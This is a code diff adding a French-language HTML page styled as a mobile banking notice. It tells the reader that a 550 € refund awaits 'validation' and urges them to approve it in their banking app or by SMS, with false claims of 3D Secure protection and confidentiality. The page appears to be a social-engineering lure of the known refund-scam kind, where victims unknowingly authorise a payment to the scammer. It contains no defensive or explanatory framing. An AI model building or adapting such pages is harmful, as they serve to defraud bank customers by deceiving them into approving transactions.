@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation Requise</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+        integrity="sha512-SzlrxWriC3V+8z+2/5m7v2HxHpIdvB1MHn3AYnD3P8p4bG3syQ8LqzRZlM2Bcbq1Rzk0r2KHw5n93XhXX6r9Og=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .phone-frame {
+            width: 360px;
+            border: 2px solid #ccc;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .screen {
+            padding: 20px;
+        }
+
+        .header {
+            background-color: #49e950;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .sub-header {
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: center;
+        }
+
+        .warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 25px;
+            font-size: 15px;
+            text-align: center;
+        }
+
+        .details {
+            margin-top: 30px;
+            font-size: 14px;
+            border-top: 1px solid #ccc;
+            padding-top: 30px;
+        }
+
+        .details h4 {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #333;
+        }
+
+        .details p {
+            font-size: 15px;
+            margin: 6px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .highlight {
+            font-weight: bold;
+            color: green;
+        }
+
+        .security {
+            background-color: #eef3fc;
+            border-left: 4px solid #4680ff;
+            padding: 10px 15px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #3b3f5c;
+            margin-top: 60px;
+        }
+
+        .source {
+            margin-top: 25px;
+            font-size: 13px;
+            text-align: center;
+            color: #555;
+        }
+
+        .source i {
+            color: #4CAF50;
+            margin-right: 6px;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="phone-frame">
+        <div class="screen">
+            <div class="header">
+                <i class="fas fa-check-circle"></i> Validation Requise
+                <div class="sub-header">Finalisez votre demande de remboursement</div>
+            </div>
+
+            <div class="warning">
+                <p><i class="fas fa-exclamation-triangle"></i> <strong>Remboursement en attente de validation</strong>
+                </p>
+                <p>Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement
+                    et créditer le montant sur votre carte. Validez par SMS si vous ne possédez pas l'application
+                    bancaire !</p>
+            </div>
+
+            <div class="details">
+                <h4><i class="fas fa-list-alt"></i> Détails de la transaction</h4>
+                <p><strong>Montant :</strong><span class="highlight">550 €</span></p>
+                <p><strong>Date :</strong><span id="dynamic-date"></span></p>
+                <p><strong>Carte :</strong><span>XXXX</span></p>
+            </div>
+
+            <div class="security">
+                <i class="fas fa-shield-alt"></i>
+                <span><strong>Sécurité maximale :</strong> Cette opération est protégée par la norme 3D Secure.</span>
+            </div>
+
+            <div class="source">
+                <i class="fas fa-lock"></i> Informations traitées de manière confidentielle
+            </div>
+        </div>
+    </div>
+    <script>
+        function formatDateTime(date) {
+            const jour = String(date.getDate()).padStart(2, '0');
+            const mois = String(date.getMonth() + 1).padStart(2, '0');
+            const annee = date.getFullYear();
+            const heures = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            return `${jour}/${mois}/${annee} ${heures}:${minutes}`;
+        }
+
+        document.getElementById("dynamic-date").textContent = formatDateTime(new Date());
+    </script>
+
+</body>
+
+</html>
